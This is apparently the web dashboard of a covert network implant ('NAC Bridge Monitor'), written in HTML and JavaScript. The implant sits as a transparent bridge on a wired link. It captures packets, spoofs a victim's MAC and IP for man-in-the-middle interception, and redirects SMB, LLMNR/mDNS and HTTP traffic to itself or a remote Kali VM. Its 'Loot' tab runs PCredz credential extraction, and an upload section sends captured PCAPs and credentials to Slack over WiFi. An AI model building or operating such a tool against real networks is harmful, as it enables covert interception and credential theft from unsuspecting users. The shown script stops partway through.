<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>NAC Bridge Monitor - Transparent Tap</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',Tahoma,sans-serif;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);min-height:100vh;padding:20px;color:#333}
.container{max-width:1400px;margin:0 auto}
.header{text-align:center;color:#fff;margin-bottom:30px}
.header h1{font-size:2.5em;margin-bottom:5px;text-shadow:2px 2px 4px rgba(0,0,0,.3)}
.header p{font-size:1em;opacity:.9}
.dashboard{background:#fff;border-radius:15px;padding:30px;box-shadow:0 10px 40px rgba(0,0,0,.2)}
.info-banner{background:#e3f2fd;border-left:4px solid #2196f3;padding:15px;margin-bottom:20px;border-radius:5px}
.info-banner h3{color:#1976d2;margin-bottom:5px}
.info-banner p{color:#555;font-size:.9em}
.tab-nav{display:flex;gap:10px;margin-bottom:25px;border-bottom:2px solid #e0e0e0}
.tab-btn{padding:12px 24px;border:none;background:transparent;cursor:pointer;font-weight:600;color:#666;border-bottom:3px solid transparent;transition:all .3s}
.tab-btn:hover{color:#667eea}
.tab-btn.active{color:#667eea;border-bottom-color:#667eea}
.badge{display:inline-block;background:#dc3545;color:#fff;border-radius:12px;padding:2px 8px;font-size:.75em;margin-left:5px;min-width:20px;text-align:center}
.tab-content{display:none}
.tab-content.active{display:block}
.status-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:20px;padding-bottom:15px;border-bottom:2px solid #f0f0f0}
.status-badge{display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border-radius:20px;font-weight:600;font-size:.9em}
.status-badge.active{background:#d4edda;color:#155724}
.status-badge.inactive{background:#f8d7da;color:#721c24}
.status-indicator{width:12px;height:12px;border-radius:50%}
.status-indicator.active{background:#28a745;animation:pulse 2s infinite}
.status-indicator.inactive{background:#dc3545}
@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:20px;margin-bottom:30px}
.card{background:#f8f9fa;border-radius:10px;padding:20px;border-left:4px solid #667eea}
.card-title{font-size:.9em;color:#666;margin-bottom:10px;text-transform:uppercase}
.card-value{font-size:1.8em;font-weight:700;color:#333}
.card-detail{font-size:.85em;color:#888;margin-top:5px}
.interface-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:15px;margin-top:15px}
.interface-card{background:#fff;border:2px solid #e0e0e0;border-radius:8px;padding:15px;transition:all .3s}
.interface-card:hover{border-color:#667eea;box-shadow:0 4px 12px rgba(102,126,234,0.2)}
.interface-header{display:flex;justify-content:space-between;margin-bottom:12px}
.interface-name{font-weight:700;font-size:1.1em;color:#667eea}
.interface-status{padding:4px 10px;border-radius:12px;font-size:.75em;font-weight:600}
.interface-status.up{background:#d4edda;color:#155724}
.interface-status.down{background:#f8d7da;color:#721c24}
.interface-detail{display:flex;justify-content:space-between;padding:6px 0;font-size:.9em;border-bottom:1px solid #f0f0f0}
.button-group{display:flex;gap:15px;flex-wrap:wrap;margin-top:20px}
.btn{flex:1;min-width:180px;padding:15px 30px;border:none;border-radius:8px;font-size:1em;font-weight:600;cursor:pointer;transition:all .3s;color:#fff}
.btn:disabled{opacity:.5;cursor:not-allowed}
.btn-start{background:#28a745}
.btn-start:hover:not(:disabled){background:#218838}
.btn-stop{background:#dc3545}
.btn-stop:hover:not(:disabled){background:#c82333}
.btn-refresh{background:#667eea}
.btn-refresh:hover:not(:disabled){background:#5568d3}
.btn-download{background:#17a2b8}
.btn-download:hover:not(:disabled){background:#138496}
.btn-danger{background:#dc3545}
.btn-danger:hover:not(:disabled){background:#c82333}
.info-box{background:#fff3cd;border-left:4px solid #ffc107;padding:15px;margin:15px 0;border-radius:5px}
.info-box h4{color:#856404;margin-bottom:8px}
.info-box p{color:#856404;font-size:.9em;margin:5px 0}
input[type="text"]{width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:15px}
input[type="text"]:focus{outline:none;border-color:#667eea}
.rule-item{background:#f8f9fa;border-left:4px solid #28a745;padding:15px;margin:10px 0;border-radius:8px;display:flex;justify-content:space-between;align-items:center}
.rule-info{font-family:monospace;font-size:.9em}
.alert{padding:15px;border-radius:8px;margin-bottom:20px;display:none}
.alert.show{display:block}
.alert-success{background:#d4edda;color:#155724}
.alert-error{background:#f8d7da;color:#721c24}
.alert-info{background:#d1ecf1;color:#0c5460}
.capture-info{background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:#fff;border-radius:10px;padding:25px;margin-bottom:20px;display:none}
.capture-info.active{display:block}
.capture-detail{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid rgba(255,255,255,.2)}
.logs-section{background:#1e1e1e;color:#0f0;border-radius:8px;padding:20px;margin-top:20px;font-family:monospace;font-size:.85em;max-height:300px;overflow-y:auto}
.loot-stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:15px;margin:20px 0}
.stat-card{background:#f8f9fa;border-radius:10px;padding:20px;text-align:center;border-left:4px solid #dc3545}
.stat-value{font-size:2.5em;font-weight:700;color:#333;margin-bottom:5px}
.stat-label{font-size:.9em;color:#666;text-transform:uppercase}
.loot-filters{display:flex;gap:10px;flex-wrap:wrap;margin:20px 0}
.filter-btn{padding:8px 16px;border:2px solid #e0e0e0;background:#fff;border-radius:20px;cursor:pointer;font-weight:600;color:#666;transition:all .3s}
.filter-btn:hover{border-color:#667eea;color:#667eea}
.filter-btn.active{background:#667eea;color:#fff;border-color:#667eea}
.loot-items{display:flex;flex-direction:column;gap:10px;margin:20px 0;max-height:500px;overflow-y:auto}
.loot-item{background:#fff;border:1px solid #e0e0e0;border-left:4px solid #dc3545;border-radius:8px;padding:15px;transition:all .3s}
.loot-item:hover{box-shadow:0 4px 12px rgba(0,0,0,.1);transform:translateX(5px)}
.loot-item.http{border-left-color:#28a745}
.loot-item.ftp{border-left-color:#17a2b8}
.loot-item.smtp{border-left-color:#ffc107}
.loot-item.ntlm{border-left-color:#dc3545}
.loot-item.imap{border-left-color:#6f42c1}
.loot-header{display:flex;justify-content:space-between;margin-bottom:10px}
.loot-protocol{font-weight:700;color:#667eea;font-size:1.1em}
.loot-timestamp{font-size:.85em;color:#999}
.loot-content{font-family:monospace;font-size:.9em;background:#f8f9fa;padding:10px;border-radius:5px;margin-top:10px}
.loot-field{padding:5px 0}
.loot-field strong{color:#333}
.empty-state{text-align:center;padding:60px 20px;color:#999}
.empty-state-icon{font-size:4em;margin-bottom:20px;opacity:.5}
</style>
</head>
<body>
<div class="container">
<div class="header">
<h1>NAC Bridge Monitor</h1>
<p>Transparent Bridge + MITM Interception</p>
</div>
<div class="dashboard">
<div class="info-banner">
<h3>[i] Transparent Mode Active</h3>
<p>Bridge operates at Layer 2 only. Client 802.1X authentication passes through transparently. No stealth mode - bridge is always active for seamless operation.</p>
</div>
<div id="alert" class="alert"></div>
<div class="tab-nav">
<button class="tab-btn active" onclick="switchTab('status')">Status</button>
<button class="tab-btn" onclick="switchTab('mitm')">MITM</button>
<button class="tab-btn" onclick="switchTab('loot')">Loot <span id="lootBadge" class="badge">0</span></button>
<button class="tab-btn" onclick="switchTab('upload')">Upload</button>
</div>
<div id="statusTab" class="tab-content active">
<div class="status-header">
<h2>Capture Status</h2>
<div id="statusBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>
<div class="grid">
<div class="card">
<div class="card-title">Capture Size</div>
<div class="card-value" id="captureSize">0 MB</div>
<div class="card-detail" id="capturePackets">0 packets</div>
</div>
<div class="card">
<div class="card-title">Duration</div>
<div class="card-value" id="captureDuration">00:00:00</div>
<div class="card-detail">Elapsed time</div>
</div>
</div>
<div id="captureInfo" class="capture-info">
<h3>Active Capture</h3>
<div class="capture-detail">
<span>File:</span>
<span id="captureFile" style="font-family:monospace">-</span>
</div>
<div class="capture-detail">
<span>Bridge:</span>
<span id="bridgeName">br0</span>
</div>
<div class="capture-detail">
<span>PID:</span>
<span id="capturePid">-</span>
</div>
</div>
<h2 style="margin-bottom:15px;color:#667eea">Network Interfaces</h2>
<div style="margin-bottom:10px;padding:10px;background:#1a1a2e;border-radius:6px;font-size:0.9em;color:#aaa">
<div><strong style="color:#667eea">Interface Roles:</strong></div>
<div style="margin-top:5px">• <strong>AP (Management):</strong> wlan0 - Management access point (always active when eth interfaces are in bridge mode)</div>
<div>• <strong>Client (Internet):</strong> wlan1/wlan2 - External communications (Slack APIs, internet)</div>
<div>• <strong>Bridge:</strong> br0 - Transparent Layer 2 bridge</div>
<div>• <strong>Bridge Member:</strong> eth0/eth1 - Ethernet interfaces in bridge mode</div>
</div>
<div id="interfaces" class="interface-grid"></div>
<div class="button-group">
<button id="btnStart" class="btn btn-start">Start Capture</button>
<button id="btnStop" class="btn btn-stop" disabled>Stop Capture</button>
<button id="btnPcapSize" class="btn btn-refresh" disabled>PCAP Size: 0 MB</button>
<button id="btnDownload" class="btn btn-download" disabled>Download PCAP</button>
<button id="btnDelete" class="btn btn-danger" disabled>Delete PCAP</button>
<button class="btn btn-refresh" onclick="fetchStatus()">Refresh</button>
</div>
<div class="logs-section">
<h3 style="color:#fff;margin-bottom:10px">Recent Logs</h3>
<div id="logs"></div>
</div>
</div>

<!-- MITM TAB -->
<div id="mitmTab" class="tab-content">
<div class="status-header">
<h2>MITM Control</h2>
<div id="mitmBadge" class="status-badge inactive">
<span class="status-indicator inactive"></span>
<span>Inactive</span>
</div>
</div>

<div class="info-box">
<h4>WARNING: MITM Mode</h4>
<p>Enables active traffic interception. Bridge learns victim MAC/IP and spoofs all attacker traffic.</p>
<p><strong>Warning:</strong> This makes the device detectable. Use carefully.</p>
</div>

<div id="victimInfo" style="display:none;background:#e7f3ff;padding:20px;border-radius:8px;margin:15px 0">
<h3 style="color:#0066cc;margin-bottom:15px">Target Device</h3>
<p style="margin:8px 0"><strong>MAC:</strong> <code id="victimMac" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>IP:</strong> <code id="victimIP" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Gateway MAC:</strong> <code id="gatewayMac" style="background:#fff;padding:4px 8px;border-radius:4px">-</code></p>
<p style="margin:8px 0"><strong>Bridge IP:</strong> <code id="bridgeIP" style="background:#fff;padding:4px 8px;border-radius:4px">10.200.66.1</code></p>
</div>

<h3 style="margin:20px 0 15px 0">Remote Attacker (Optional)</h3>
<p style="margin-bottom:15px;color:#666">Route intercepted traffic to external attack VM over WiFi (e.g., Kali at 172.31.250.100)</p>
<input type="text" id="remoteIP" placeholder="Remote VM IP (e.g., 172.31.250.100)">

<div class="button-group">
<button id="btnEnableMITM" class="btn btn-danger" onclick="enableMITM()">Enable MITM</button>
<button id="btnDisableMITM" class="btn btn-stop" onclick="disableMITM()" disabled>Disable MITM</button>
</div>

<h3 style="margin:25px 0 15px 0">Protocol Interception</h3>
<p style="margin-bottom:15px;color:#666">Intercept specific protocols and redirect to bridge IP or remote attacker</p>

<div class="grid" style="margin-bottom:20px">
<div class="card" style="border-left-color:#dc3545;cursor:pointer" onclick="interceptCategory('smb')">
<div class="card-title">SMB/NetBIOS</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Ports 137,138,139,445</div>
<div style="margin-top:10px;font-size:.85em;color:#dc3545;font-weight:600">Click to Intercept</div>
</div>
<div class="card" style="border-left-color:#ffc107;cursor:pointer" onclick="interceptCategory('name_resolution')">
<div class="card-title">Name Resolution</div>
<div style="font-size:.9em;color:#666;margin-top:8px">LLMNR, mDNS</div>
<div style="margin-top:10px;font-size:.85em;color:#ffc107;font-weight:600">Click to Intercept</div>
</div>
<div class="card" style="border-left-color:#17a2b8;cursor:pointer" onclick="interceptCategory('http')">
<div class="card-title">HTTP</div>
<div style="font-size:.9em;color:#666;margin-top:8px">Port 80</div>
<div style="margin-top:10px;font-size:.85em;color:#17a2b8;font-weight:600">Click to Intercept</div>
</div>
</div>

<h3 style="margin:20px 0 15px 0">Active Intercept Rules</h3>
<div id="activeRules"></div>
<button class="btn btn-danger" onclick="clearRules()" style="margin-top:15px">Clear All Rules</button>
</div>

<div id="lootTab" class="tab-content">
<h2 style="margin-bottom:20px;color:#667eea">PCredz Analysis Output</h2>
<div class="button-group" style="margin-bottom:20px">
<button onclick="analyzeNow()" id="btnAnalyze" class="btn btn-start">Analyze PCAP Now</button>
<button onclick="exportLoot()" class="btn btn-download">Export Output (TXT)</button>
<button onclick="clearLoot()" class="btn btn-danger">Clear Output</button>
</div>
<div id="lootOutput" class="logs-section" style="max-height:600px;white-space:pre-wrap;word-wrap:break-word">
<div style="color:#999;text-align:center;padding:40px">
<div style="font-size:3em;margin-bottom:15px">[ ]</div>
<p>No PCredz output yet</p>
<p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p>
</div>
</div>
</div>

<div id="uploadTab" class="tab-content">
<h2 style="margin-bottom:20px;color:#667eea">WiFi & Slack Upload</h2>

<div style="background:#f8f9fa;border-radius:10px;padding:20px;margin-bottom:20px">
<h3 style="margin-bottom:15px;color:#333">WiFi Connection</h3>
<div id="currentConnection" style="padding:12px;background:#fff;border-left:4px solid #667eea;border-radius:5px;margin-bottom:15px;display:none">
<strong style="color:#333">Current Connection:</strong><br>
<span id="currentConnectionInfo" style="color:#666;font-size:.9em">Not connected</span>
</div>
<div style="margin-bottom:15px">
<label style="display:block;margin-bottom:5px;font-weight:600">WLAN Interface</label>
<select id="wifiInterface" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
<option value="">Select interface...</option>
</select>
<button onclick="scanAPs()" class="btn btn-refresh" style="width:100%">Scan for APs</button>
</div>
<div id="apList" style="margin-bottom:15px;max-height:200px;overflow-y:auto"></div>
<div style="margin-bottom:15px">
<label style="display:block;margin-bottom:5px;font-weight:600">SSID</label>
<input type="text" id="wifiSSID" placeholder="Network name" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
<label style="display:block;margin-bottom:5px;font-weight:600">Password</label>
<input type="password" id="wifiPassword" placeholder="WiFi password" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
<div class="button-group">
<button onclick="connectWiFi()" class="btn btn-start">Connect</button>
<button onclick="disconnectWiFi()" class="btn btn-stop">Disconnect</button>
<button onclick="testInternet()" id="btnTestInternet" class="btn btn-refresh">Test Internet</button>
</div>
</div>
<div id="wifiStatus" style="padding:10px;background:#fff;border-radius:5px;margin-top:10px"></div>
</div>

<div id="internetTestSection" style="background:#e3f2fd;border-radius:10px;padding:20px;margin-bottom:20px;border-left:4px solid #2196f3;display:none">
<h3 style="margin-bottom:15px;color:#1976d2">Internet Connectivity Test</h3>
<div id="internetTestResults" style="background:#fff;border-radius:8px;padding:15px;margin-bottom:15px">
<div style="text-align:center;color:#999;padding:20px">Click "Test Internet" to run connectivity test</div>
</div>
<div class="button-group">
<button onclick="testInternet()" id="btnTestInternetDetailed" class="btn btn-refresh">Run Internet Test</button>
</div>
</div>

<div style="background:#f8f9fa;border-radius:10px;padding:20px;margin-bottom:20px">
<h3 style="margin-bottom:15px;color:#333">Slack Integration</h3>
<div style="margin-bottom:15px">
<label style="display:block;margin-bottom:5px;font-weight:600">Webhook URL</label>
<input type="text" id="slackWebhook" placeholder="https://hooks.slack.com/services/..." style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
<button onclick="testWebhook()" class="btn btn-refresh" style="width:100%;margin-bottom:10px">Test Webhook</button>
</div>
<div style="margin-bottom:15px">
<label style="display:block;margin-bottom:5px;font-weight:600">Bot Token</label>
<input type="text" id="slackToken" placeholder="xoxb-..." style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
<button onclick="testToken()" class="btn btn-refresh" style="width:100%;margin-bottom:10px">Test Token</button>
</div>
<div style="margin-bottom:15px">
<label style="display:block;margin-bottom:5px;font-weight:600">Channel</label>
<input type="text" id="slackChannel" placeholder="#nac-tap" style="width:100%;padding:12px;border:2px solid #e0e0e0;border-radius:8px;font-size:1em;margin-bottom:10px">
</div>
<div style="margin-bottom:15px;padding:15px;background:#fff;border-radius:5px">
<label style="display:block;margin-bottom:10px;font-weight:600">Upload Options</label>
<label style="display:flex;align-items:center;gap:10px;cursor:pointer;margin-bottom:8px">
<input type="checkbox" id="uploadPCAP" checked> Upload PCAP files
</label>
<label style="display:flex;align-items:center;gap:10px;cursor:pointer">
<input type="checkbox" id="uploadPCredz" checked> Upload PCredz output (loot.json + raw.txt)
</label>
</div>
<div class="button-group">
<button onclick="testIntegration()" class="btn btn-refresh">Test Integration</button>
<button onclick="enableUpload()" class="btn btn-start">Enable Upload</button>
<button onclick="triggerUpload()" class="btn btn-download">Upload Now</button>
</div>
<div id="slackStatus" style="padding:10px;background:#fff;border-radius:5px;margin-top:10px"></div>
</div>

<div style="background:#f8f9fa;border-radius:10px;padding:20px">
<h3 style="margin-bottom:15px;color:#333">Configuration</h3>
<div style="margin-bottom:15px">
<label style="display:flex;align-items:center;gap:10px;cursor:pointer">
<input type="checkbox" id="autoConnect"> Auto-connect WiFi on startup
</label>
<label style="display:flex;align-items:center;gap:10px;cursor:pointer;margin-top:10px">
<input type="checkbox" id="autoUpload"> Auto-enable upload on startup
</label>
</div>
<div class="button-group">
<button onclick="saveConfig()" class="btn btn-start">Save Configuration</button>
<button onclick="loadConfig()" class="btn btn-refresh">Load Saved</button>
</div>
<div id="configStatus" style="padding:10px;background:#fff;border-radius:5px;margin-top:10px"></div>
</div>
</div>
</div>
</div>
<script>
// Error boundary - catch all errors
window.addEventListener('error', function(e) {
    console.error('Global error:', e.message, 'at', e.filename, 'line', e.lineno);
    alert('JavaScript Error: ' + e.message + ' at line ' + e.lineno);
});

console.log('Script starting...');

let startTime=null,currentFilter='all',allLoot=[];
function showAlert(message,type="info"){
    try{
        const el=document.getElementById("alert");
        if(!el){console.error('Alert element not found');return}
        el.className="alert alert-"+type+" show";
        el.textContent=message;
        setTimeout(function(){el.classList.remove("show")},5000);
    }catch(err){
        console.error('showAlert error:',err);
        alert(message);
    }
}
function formatBytes(bytes){if(bytes===0)return"0 B";const k=1024,sizes=["B","KB","MB","GB"];const i=Math.floor(Math.log(bytes)/Math.log(k));return parseFloat((bytes/Math.pow(k,i)).toFixed(2))+" "+sizes[i]}
function formatDuration(seconds){const h=Math.floor(seconds/3600);const m=Math.floor(seconds%3600/60);const s=Math.floor(seconds%60);return h.toString().padStart(2,"0")+":"+m.toString().padStart(2,"0")+":"+s.toString().padStart(2,"0")}
function switchTab(tab){
    try{
        console.log('Switching to tab:', tab);
        document.querySelectorAll(".tab-content").forEach(el=>el.classList.remove("active"));
        document.querySelectorAll(".tab-btn").forEach(el=>el.classList.remove("active"));
        const tabEl=document.getElementById(tab+"Tab");
        if(tabEl)tabEl.classList.add("active");
        if(window.event&&window.event.target)window.event.target.classList.add("active");
        if(tab==="loot")fetchLoot();
        if(tab==="mitm")fetchStatus();
    }catch(err){
        console.error('switchTab error:',err);
        alert('Tab switch error: '+err.message);
    }
}
function updateStatus(data){
try{
const isActive=data.status==="active";
const badge=document.getElementById("statusBadge");
if(badge){
badge.className="status-badge "+(isActive?"active":"inactive");
badge.innerHTML='<span class="status-indicator '+(isActive?"active":"inactive")+'"></span><span>'+(isActive?"Active":"Inactive")+'</span>';
}
const captureInfo=document.getElementById("captureInfo");
if(captureInfo){
captureInfo.className="capture-info "+(isActive?"active":"");
}
const size=data.pcap_size||0;
const packets=data.packet_count||0;
const pcapSizeBtn=document.getElementById("btnPcapSize");
if(pcapSizeBtn){
pcapSizeBtn.textContent="PCAP Size: "+formatBytes(size);
pcapSizeBtn.disabled=!data.pcap_file;
}
if(data.mitm){
const mitmBadge=document.getElementById("mitmBadge");
if(mitmBadge){
const enabled=data.mitm.enabled;
mitmBadge.className="status-badge "+(enabled?"active":"inactive");
mitmBadge.innerHTML='<span class="status-indicator '+(enabled?"active":"inactive")+'"></span><span>'+(enabled?"Active":"Inactive")+'</span>';
}
const btnEnableMITM=document.getElementById("btnEnableMITM");
if(btnEnableMITM)btnEnableMITM.disabled=data.mitm.enabled;
const btnDisableMITM=document.getElementById("btnDisableMITM");
if(btnDisableMITM)btnDisableMITM.disabled=!data.mitm.enabled;
if(data.mitm.victim_mac){
const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="block";
const victimMac=document.getElementById("victimMac");
if(victimMac)victimMac.textContent=data.mitm.victim_mac;
const victimIP=document.getElementById("victimIP");
if(victimIP)victimIP.textContent=data.mitm.victim_ip||"Unknown";
const gatewayMac=document.getElementById("gatewayMac");
if(gatewayMac)gatewayMac.textContent=data.mitm.gateway_mac||"Unknown";
}else{
const victimInfo=document.getElementById("victimInfo");
if(victimInfo)victimInfo.style.display="none";
}
const rulesDiv=document.getElementById("activeRules");
if(rulesDiv){
if(data.mitm.active_rules&&data.mitm.active_rules.length>0){
var rulesHTML='';
for(var i=0;i<data.mitm.active_rules.length;i++){
var rule=data.mitm.active_rules[i];
rulesHTML+='<div class="rule-item"><div class="rule-info"><strong>'+rule.protocol+'</strong> port '+rule.port+' to '+rule.target_ip+' ('+rule.destination+')</div></div>';
}
rulesDiv.innerHTML=rulesHTML;
}else{
rulesDiv.innerHTML='<p style="color:#999;text-align:center;padding:20px">No active intercept rules</p>';
}
}
}
if(isActive){
const captureFile=document.getElementById("captureFile");
if(captureFile)captureFile.textContent=data.pcap_file?data.pcap_file.split("/").pop():"-";
const capturePid=document.getElementById("capturePid");
if(capturePid)capturePid.textContent=data.pid||"-";
const bridgeName=document.getElementById("bridgeName");
if(bridgeName)bridgeName.textContent=data.bridge||"br0";
const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=formatBytes(size);
const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent=packets.toLocaleString()+" packets";
if(data.start_time){
if(!startTime)try{startTime=new Date(data.start_time)}catch(e){startTime=new Date}
const elapsed=Math.floor((new Date()-startTime)/1000);
const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent=formatDuration(elapsed);
}
const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=true;
const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=false;
const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=true;
const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=false;
}else{
const btnStart=document.getElementById("btnStart");
if(btnStart)btnStart.disabled=false;
const btnStop=document.getElementById("btnStop");
if(btnStop)btnStop.disabled=true;
const btnDelete=document.getElementById("btnDelete");
if(btnDelete)btnDelete.disabled=!data.pcap_file;
const btnDownload=document.getElementById("btnDownload");
if(btnDownload)btnDownload.disabled=!data.pcap_file;
startTime=null;
const captureSize=document.getElementById("captureSize");
if(captureSize)captureSize.textContent=data.pcap_size?formatBytes(data.pcap_size):"0 MB";
const capturePackets=document.getElementById("capturePackets");
if(capturePackets)capturePackets.textContent="0 packets";
const captureDuration=document.getElementById("captureDuration");
if(captureDuration)captureDuration.textContent="00:00:00";
}
if(data.interfaces){
const container=document.getElementById("interfaces");
if(container){
var intfHTML='';
for(var i=0;i<data.interfaces.length;i++){
var intf=data.interfaces[i];
intfHTML+='<div class="interface-card">';
intfHTML+='<div class="interface-header">';
intfHTML+='<span class="interface-name">'+intf.name+'</span>';
intfHTML+='<span class="interface-status '+(intf.state==="UP"?"up":"down")+'">'+intf.state+'</span>';
intfHTML+='</div>';
if(intf.role_label){
intfHTML+='<div class="interface-detail"><span>Role:</span><span style="font-weight:600;color:#667eea">'+(intf.role_label||"Unknown")+'</span></div>';
}
intfHTML+='<div class="interface-detail"><span>MAC:</span><span style="font-family:monospace">'+(intf.mac||"N/A")+'</span></div>';
if(intf.ip&&intf.ip!=="N/A"){
intfHTML+='<div class="interface-detail"><span>IP:</span><span style="font-family:monospace">'+(intf.ip||"N/A")+'</span></div>';
}
intfHTML+='</div>';
}
container.innerHTML=intfHTML;
}
}
if(data.logs&&data.logs.length>0){
const logEl=document.getElementById("logs");
if(logEl){
var logHTML='';
for(var i=0;i<data.logs.length;i++){
logHTML+='<div style="padding:2px 0">'+data.logs[i]+'</div>';
}
logEl.innerHTML=logHTML;
logEl.scrollTop=logEl.scrollHeight;
}
}
if(data.wifi){
updateWifiStatus(data.wifi);
updateCurrentConnection(data.wifi);
}
if(data.slack){
const slackStatus=document.getElementById("slackStatus");
if(slackStatus){
let html="<strong>Upload Status:</strong><br>";
html+="Enabled: "+(data.slack.enabled?"Yes":"No")+"<br>";
if(data.slack.last_upload_time){
html+="Last Upload: "+new Date(data.slack.last_upload_time).toLocaleString()+"<br>";
}
if(data.slack.last_heartbeat_time){
html+="Last Heartbeat: "+new Date(data.slack.last_heartbeat_time).toLocaleString();
}
slackStatus.innerHTML=html;
}
}
}catch(err){
console.error("Error updating status:",err);
}
}
async function analyzeNow(){const btnAnalyze=document.getElementById("btnAnalyze");if(btnAnalyze)btnAnalyze.disabled=true;showAlert("Running PCredz analysis... This may take a few minutes.","info");try{const res=await fetch("/api/analyze",{method:"POST"});const data=await res.json();if(data.success){showAlert("Analysis complete! Check output below.","success");fetchLoot()}else{showAlert("Analysis failed: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}finally{if(btnAnalyze)btnAnalyze.disabled=false}}
async function deletePCAP(){if(confirm("Delete current PCAP file? This cannot be undone!")){try{const res=await fetch("/api/delete_pcap",{method:"POST"});const data=await res.json();if(data.success){showAlert("PCAP deleted","success");fetchStatus();fetchLoot()}else{showAlert("Failed to delete PCAP: "+(data.error||"Unknown error"),"error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
async function fetchStatus(){try{const res=await fetch("/api/status");const data=await res.json();updateStatus(data)}catch(err){console.error("Failed to fetch status:",err);setTimeout(fetchStatus,5000)}}
async function fetchLoot(){try{const res=await fetch("/api/loot");const data=await res.json();const outputEl=document.getElementById("lootOutput");if(outputEl){if(data.has_output&&data.raw_output){outputEl.innerHTML='<pre style="margin:0;color:#0f0;font-family:monospace;font-size:.9em">'+escapeHtml(data.raw_output)+'</pre>';const badge=document.getElementById("lootBadge");if(badge)badge.textContent="OK"}else{outputEl.innerHTML='<div style="color:#999;text-align:center;padding:40px"><div style="font-size:3em;margin-bottom:15px">...</div><p>No PCredz output yet</p><p style="margin-top:10px;font-size:.9em">Click "Analyze PCAP Now" to run credential extraction</p></div>';const badge=document.getElementById("lootBadge");if(badge)badge.textContent="0"}}}catch(err){console.error("Failed to fetch loot:",err)}}
function escapeHtml(text){const div=document.createElement('div');div.textContent=text;return div.innerHTML}
async function exportLoot(){try{const res=await fetch("/api/loot");const data=await res.json();if(data.has_output){window.location.href="/api/loot/export"}else{showAlert("No output to export yet","info")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function clearLoot(){if(confirm("Clear all captured credentials?")){try{const res=await fetch("/api/loot/clear",{method:"POST"});const data=await res.json();if(data.success){showAlert("Loot cleared","success");fetchLoot()}else{showAlert("Failed to clear loot","error")}}catch(err){showAlert("Error: "+err.message,"error")}}}
async function startCapture(){document.getElementById("btnStart").disabled=true;showAlert("Starting packet capture...","info");try{const res=await fetch("/api/start",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture started!","success");setTimeout(fetchStatus,2000);setTimeout(fetchLoot,3000)}else{showAlert("Failed to start. Check logs.","error");document.getElementById("btnStart").disabled=false}}catch(err){showAlert("Error: "+err.message,"error");document.getElementById("btnStart").disabled=false}}
async function stopCapture(){if(confirm("Stop capture? Bridge will remain active.")){document.getElementById("btnStop").disabled=true;showAlert("Stopping capture...","info");try{const res=await fetch("/api/stop",{method:"POST"});const data=await res.json();if(data.success){showAlert("Capture stopped!","success")}else{showAlert("Failed to stop","error")}setTimeout(fetchStatus,3000);setTimeout(fetchLoot,4000)}catch(err){showAlert("Error: "+err.message,"error")}}}
async function downloadPCAP(){try{const res=await fetch("/api/status");const data=await res.json();if(data.pcap_file){window.location.href="/api/download?file="+encodeURIComponent(data.pcap_file)}else{showAlert("No file","error")}}catch(err){showAlert("Error: "+err.message,"error")}}
async function enableMITM(){const remoteIP=document.getElementById("remoteIP").value.trim();const msg=remoteIP?"Enable MITM and route to "+remoteIP+"?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Route intercepted traffic to remote VM":"Enable MITM (local mode)?\n\nThis will:\n1. Learn victim MAC/IP\n2. Spoof victim identity\n3. Intercept traffic locally";if(!confirm(msg))return;const btnEnableMITM=document.getElementById("btnEnableMITM");if(btnEnableMITM)btnEnableMITM.disabled=true;showAlert("Enabling MITM... Learning victim (30s)","info");try{const body=remoteIP?JSON.stringify({remote_ip:remoteIP}):'{}';const res=await fetch("/api/mitm/enable",{method:"POST",headers:{"Content-Type":"application/json"},body:body});const data=await res.json();if(data.success){showAlert("MITM enabled! Victim identified.","success");setTimeout(fetchStatus,1000)}else{showAlert("MITM failed: "+(data.error||"Unknown error"),"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}catch(err){showAlert("Error: "+err.message,"error");if(btnEnableMITM)btnEnableMITM.disabled=false}}
